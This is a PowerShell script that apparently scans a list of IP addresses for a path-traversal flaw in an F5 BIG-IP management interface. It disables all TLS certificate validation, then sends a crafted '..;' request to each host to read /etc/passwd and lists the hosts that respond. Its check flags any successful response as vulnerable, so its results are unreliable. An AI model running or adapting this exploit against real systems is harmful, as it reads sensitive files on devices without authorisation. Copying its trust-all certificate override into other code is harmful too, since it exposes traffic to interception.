#ignore SSL
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$myList = @("172.0.0.1","192.0.0.1") #list of ip here
$resultList = @() #result list

#checking of list of ip
for ($i = 0; $i -le ($myList.length - 1); $i += 1) {
  $output = 0
  $output = Invoke-WebRequest -Uri "https://$($myList[$i])/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
   if ($output -ne 0){
    echo "The IP $($myList[$i]) is vulnerable"
    $resultList += " $($myList[$i])"
    Invoke-WebRequest -Uri "https://$($myList[$i])/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"

   }
 }

 echo "IP(s) vulnerable(s)...: $($resultList)"
